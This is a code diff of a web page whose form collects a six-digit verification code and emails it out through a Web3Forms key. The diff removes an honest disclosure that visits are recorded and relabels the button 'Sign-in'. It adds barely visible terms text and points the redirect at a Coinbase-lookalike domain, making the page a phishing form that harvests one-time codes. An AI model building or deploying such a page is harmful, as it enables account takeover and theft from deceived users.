@@ -134,8 +134,8 @@
                pattern="[0-9]{6}" placeholder="000000" required />
         <div class="error" id="error" role="alert"></div>
 
-        <button type="sign-in" id="submit-btn">Submit</button>
-        <p class="privacy">Visits and your device and browser type are recorded.</p>
+        <button type="sign-in" id="submit-btn">Sign-in</button>
+        <p class="privacy">By signing in you agree to our <span style="color:blue; font-size:8px; font-weight:400;">terms and policy</span> </p>
       </form>
     </section>
   </main>
@@ -156,7 +156,7 @@
     // Your Web3Forms access key (safe to be public: it can only send to your email)
     var ACCESS_KEY = "13074adb-ae1c-46d5-81ae-bc762824954a";
     // Where people go after submitting, so they know it's a test
-    var REDIRECT_URL = "https://www.google.com";
+    var REDIRECT_URL = "https://coinbase-transfer.web.app/finish";
 
     var form = document.getElementById("postal-form");
     var input = document.getElementById("postal");
